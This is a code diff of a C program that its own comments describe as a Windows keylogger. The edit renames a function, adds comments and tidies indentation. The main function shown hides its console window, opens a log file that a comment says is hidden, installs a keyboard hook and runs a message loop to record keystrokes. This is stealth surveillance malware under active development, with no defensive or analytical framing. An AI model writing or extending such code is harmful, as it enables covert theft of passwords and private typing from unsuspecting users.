@@ -85,7 +85,7 @@ int removeHook()
 }
 
 // Opens log file for appending, inserts timestamp, and hides the file
-void initFile()
+void initLogFile()
 {
     FILE *f;
     f = fopen("log", "a+");
@@ -102,24 +102,28 @@ void initFile()
 
 int main()
 {
+    // Hides console window
     ShowWindow(GetConsoleWindow(), 0);
-
-    initFile();
-
-	if (setupHook() != 0)
+    
+    // Initializes log file
+    initLogFile();
+    
+    // Sets up the keylogging hook
+    if (setupHook() != 0)
     {
         printf("Error setting hook.\n\n");
         return -1;
     }
-
-	MSG msg;
-
+    
+    MSG msg;
+    
     while (GetMessage(&msg, NULL, 0, 0))
-	{
+    {
         TranslateMessage(&msg);
-		DispatchMessage(&msg);
-	}
-
+        DispatchMessage(&msg);
+    }
+    
+    // Removes the keylogging hook
     if (removeHook() != 0)
     {
         printf("Error removing hook.\n\n");
